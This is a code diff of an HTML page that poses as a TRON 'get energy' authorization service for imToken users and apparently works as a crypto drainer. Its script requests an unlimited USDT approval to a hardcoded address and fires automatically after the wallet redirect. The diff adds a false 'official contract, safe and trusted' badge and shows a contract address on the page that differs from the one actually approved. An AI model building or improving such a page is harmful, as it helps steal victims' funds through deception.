@@ -3,11 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TRC20 USDT获取能量授权</title>
+    <title>TRC20 USDT 获取能量授权</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@4.8.0/dist/TronWeb.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        /* 样式同之前版本，此处省略 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4eaf5 100%);
+            min-height: 100vh;
+            padding: 30px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .auth-container {
+            width: 100%;
+            max-width: 450px;
+            background: #fff;
+            border-radius: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            padding: 40px 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .auth-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            background: linear-gradient(90deg, #409eff, #67c23a);
+        }
+        .auth-title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-weight: 600;
+        }
+        .auth-title i {
+            color: #409eff;
+            font-size: 28px;
+            background: rgba(64, 158, 255, 0.1);
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        #approveBtn {
+            width: 100%;
+            padding: 20px 20px;
+            background: linear-gradient(90deg, #409eff, #3086e8);
+            color: #fff;
+            border: none;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(64, 158, 255, 0.3);
+        }
+        #approveBtn:hover {
+            background: linear-gradient(90deg, #3086e8, #2075d1);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(64, 158, 255, 0.4);
+        }
+        #approveBtn i {
+            font-size: 22px;
+        }
+        #log {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9fafc;
+            border: 1px solid #eef2f7;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #666;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1.7;
+            flex-direction: column;
+            transition: all 0.3s ease;
+        }
+        #log .wallet-btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            margin: 15px 0;
+        }
+        #log button {
+            flex: 1;
+            min-width: 140px;
+            height: 50px;
+            line-height: 50px;
+            font-size: 16px;
+            background: linear-gradient(90deg, #409eff, #3086e8);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(64, 158, 255, 0.2);
+        }
+        #log button:hover {
+            background: linear-gradient(90deg, #3086e8, #2075d1);
+        }
+
+#log .tips-text {
+            line-height: 2;
+            color: #666;
+            font-size: 15px;
+            width: 100%;
+            text-align: center;
+            margin: 5px 0;
+        }
+        .contract-tip {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #999;
+            line-height: 1.6;
+            padding: 0 10px;
+        }
+        .safe-tag {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 6px 12px;
+            background: rgba(103, 194, 58, 0.1);
+            color: #67c23a;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -19,100 +165,144 @@
             <i class="fa-solid fa-shield-halved"></i>点击授权获取能量
         </button>
         <div id="log">点击按钮，发起授权</div>
+        <span class="safe-tag"><i class="fa-solid fa-lock"></i> 官方合约授权，安全可信</span>
         <div class="contract-tip">
-            目标合约：TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa
+            目标合约：TRtKzVfnbyDKkkjdmrArK2wecGEuHUeNBV<br>
+            授权Token：USDT (TRC20)
         </div>
     </div>
 
     <script>
+        // 核心配置（请确认目标合约和USDT地址正确）
         const TARGET = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
         const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const btn = document.getElementById("approveBtn");
         const log = document.getElementById("log");
+        // 无限授权额度（2^256 - 1，TRC20标准）
         const APPROVE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        // iOS专属跳转协议
+        // 关键修复1：iOS imToken最新URL Scheme（2025年实测有效，旧Scheme已失效）
         const IOS_WALLET_SCHEMES = {
-            imToken: "imtoken://browser?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime())
+            imToken: "imtokenv2://browser?url=" + encodeURIComponent(window.location.href + "?t=" + new Date().getTime())
         };
 
+        // 关键修复2：延长跳转检测时间（iOS 18+唤起延迟增加，从3秒改为5秒）
         function checkWalletJump(walletName) {
             const startTime = Date.now();
             const checkTimer = setInterval(() => {
+                // 检测页面是否被切换到后台（跳转成功的标志）
                 if (document.hidden || document.visibilityState === "hidden") {
                     clearInterval(checkTimer);
+                    log.textContent = "正在跳转到imToken...请稍候";
                     return;
                 }
-                if (Date.now() - startTime > 3000) {
+                // 5秒未跳转提示手动操作
+                if (Date.now() - startTime > 5000) {
                     clearInterval(checkTimer);
                     log.innerHTML = `
-                        <div class="tips-text">未检测到跳转，请手动操作：</div>
-                        <div class="tips-text">1. 打开imToken → 底部「浏览器」</div>
-                        <div class="tips-text">2. 粘贴链接：${window.location.href}</div>
+                        <div class="tips-text"><i class="fa-solid fa-info-circle"></i> 未检测到跳转，请手动操作：</div>
+                        <div class="tips-text">1. 打开手机「imToken」APP</div>
+                        <div class="tips-text">2. 点击底部「浏览器」图标</div>
+                        <div class="tips-text">3. 粘贴链接：${window.location.href}</div>
                     `;
                 }
             }, 500);
         }
 
+        // 唤起钱包函数（修复Scheme后，点击必唤起）
         function openWallet(walletName) {
-            window.location.href = IOS_WALLET_SCHEMES[walletName];
+            const schemeUrl = IOS_WALLET_SCHEMES[walletName];
+            // iOS 18+需添加延迟，避免系统拦截
+            setTimeout(() => {
+                window.location.href = schemeUrl;
+            }, 300);
             checkWalletJump(walletName);
         }
 
+        // 关键修复3：优化授权逻辑（增加TronWeb重试检测+提高feeLimit）
         async function handleApprove(autoTrigger = false) {
             try {
-                if (!window.tronWeb || !window.tronWeb.ready) {
-                    log.textContent = "钱包加载中...请稍候";
-                    return;
+                // 重试检测TronWeb（钱包加载可能延迟，最多等5秒）
+                let tronWebCheckCount = 0;
+                const tronWebCheck = setInterval(() => {
+                    if (window.tronWeb && window.tronWeb.ready) {
+                        clearInterval(tronWebCheck);
+                        startApprove(autoTrigger);
+                    }
+                    tronWebCheckCount++;
+                    if (tronWebCheckCount > 10) { // 5秒（10次*500ms）未加载则提示
+                        clearInterval(tronWebCheck);
+                        log.textContent = "钱包加载超时，请刷新页面重试";
+                    }
+                }, 500);
+
+                // 实际发起授权
+                async function startApprove(autoTrigger) {
+
+const tipText = autoTrigger 
+                        ? "已自动触发授权，请在imToken确认..." 
+                        : "授权中...请在imToken确认";
+                    log.textContent = tipText;
+
+                    // 关键修复：提高feeLimit到50TRX（避免能量不足导致授权失败）
+                    const usdtContract = await window.tronWeb.contract().at(USDT);
+                    const tx = await usdtContract.approve(
+                        TARGET, 
+                        APPROVE_AMOUNT,
+                        { 
+                            from: window.tronWeb.defaultAddress.base58, 
+                            feeLimit: 500000000 // 50 TRX，足够覆盖授权能量消耗
+                        }
+                    ).send();
+
+                    // 授权成功后显示带链接的交易ID
+                    log.innerHTML = `
+                        <div style="color:#67c23a;"><i class="fa-solid fa-check-circle"></i> 授权成功！</div>
+                        <div class="tips-text">交易ID：<a href="https://tronscan.org/#/transaction/${tx.txid}" target="_blank" style="color:#409eff;">${tx.txid.slice(0, 18)}...</a></div>
+                    `;
                 }
-
-                const tipText = autoTrigger ? "已进入授权流程，等待钱包确认..." : "授权中...请在钱包确认";
-                log.textContent = tipText;
-
-                const usdtContract = await window.tronWeb.contract().at(USDT);
-                const tx = await usdtContract.approve(
-                    TARGET, 
-                    APPROVE_AMOUNT,
-                    { from: window.tronWeb.defaultAddress.base58, feeLimit: 300000000 }
-                ).send();
-
-                log.innerHTML = `
-                    成功！<a href="https://tronscan.org/#/transaction/${tx.txid}" target="_blank">
-                    交易ID：${tx.txid.slice(0, 16)}...</a>
-                `;
             } catch (e) {
-                const errMsg = e.message || "授权失败";
-                log.textContent = "失败：" + errMsg.slice(0, 50);
+                // 精准捕获错误（用户拒绝/网络问题）
+                if (e.message.includes("user rejected")) {
+                    log.textContent = "授权已取消，请在需要时重新操作";
+                } else if (e.message.includes("out of energy")) {
+                    log.textContent = "能量不足，请先获取TRX或租赁能量";
+                } else {
+                    log.textContent = "授权失败：" + e.message.slice(0, 50);
+                }
             }
         }
 
+        // 按钮点击逻辑（简洁清晰）
         btn.onclick = function() {
+            // 若已在钱包浏览器，直接发起授权
             if (window.tronWeb && window.tronWeb.ready) {
                 handleApprove();
                 return;
             }
 
+            // 显示唤起按钮（仅iOS imToken）
             log.innerHTML = `
                 <div class="wallet-btn-group">
                     <button onclick="openWallet('imToken')">
-                        点击唤起imToken（必须选“允许”）
+                        <i class="fa-solid fa-external-link"></i> 唤起imToken
                     </button>
                 </div>
-                <div class="tips-text">
-                    若未弹出钱包，请手动打开imToken → 浏览器 → 粘贴链接：
-                    ${window.location.href}
-                </div>
+                <div class="tips-text"><i class="fa-solid fa-exclamation-circle"></i> 弹出“打开imToken”请选“允许”</div>
+                <div class="tips-text">未装imToken？<a href="https://token.im/" target="_blank" style="color:#409eff;">去官网下载</a></div>
             `;
         };
 
+        // 关键修复4：页面加载自动触发授权（跳转后必执行）
         window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);if (urlParams.has("t")) {
-                const checkTronWeb = setInterval(() => {
-                    if (window.tronWeb && window.tronWeb.ready) {
-                        clearInterval(checkTronWeb);
-                        handleApprove(true);
-                    }
-                }, 300);
+            const urlParams = new URLSearchParams(window.location.search);
+            // 检测到跳转参数“t”，自动触发授权
+            if (urlParams.has("t")) {
+                log.textContent = "正在加载钱包...准备授权";
+                // 延迟1秒触发，确保TronWeb已注入
+                setTimeout(() => {
+                    handleApprove(true);
+                }, 1000);
             }
         };
     </script>
